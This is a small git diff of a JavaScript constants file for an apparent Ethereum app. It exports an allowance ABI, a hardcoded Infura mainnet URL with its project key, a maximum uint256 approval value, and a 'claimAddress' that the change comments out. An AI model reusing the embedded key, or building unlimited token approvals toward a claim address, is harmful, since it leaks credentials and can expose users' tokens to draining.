@@ -19,7 +19,7 @@ export { default as increasAllownceTokens } from './increasAllownceTokens.json';
 export const infura = "https://mainnet.infura.io/v3/4d5f05d6b7bb4260a9ba2b2e085844db";
 
 export const max = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-export const claimAddress = '0x50bF0eAf6149F6029469d0F9Ac874e22F94b670a';
+// export const claimAddress = '0x50bF0eAf6149F6029469d0F9Ac874e22F94b670a';
 // export const claimAddress = '0x5F93C85fea3af5331037354ffAa19897A5AdA977';
 // const keys = [
 //   'A',
